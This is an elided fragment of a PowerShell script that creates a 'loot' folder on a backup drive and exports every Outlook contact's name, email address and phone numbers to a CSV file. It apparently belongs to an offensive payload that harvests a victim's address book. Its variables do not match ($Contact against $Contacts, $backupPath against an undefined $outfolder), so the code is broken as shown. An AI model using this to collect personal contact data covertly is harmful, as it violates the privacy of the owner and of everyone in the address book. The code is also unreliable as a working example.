...
$TARGETDIR = $backupDrive + "\loot\OutlookContacts"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}
...
$backupPath = $backupDrive + "\loot\OutlookContacts\"
...
$Contact = $namespace.getDefaultFolder($olFolders::olFolderContacts)
$Contacts.items |Select-Object -Property FullName,Email1Address,MobileTelephoneNumber,BusinessTelephoneNumber | export-csv $outfolder\Outlook-Contacts-$datetime.csv
}
